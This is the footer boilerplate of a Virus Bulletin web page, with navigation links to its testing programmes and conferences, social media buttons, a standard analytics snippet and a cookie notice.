<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td>Â </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td>Â </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td>Â </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td>Â </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">Â©1989-2022 Virus Bulletin.Â Â Â Â Â Â Â Â <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>Â Â Â Â Â Â Â Â <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>Â Â Â Â Â Â Â Â <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>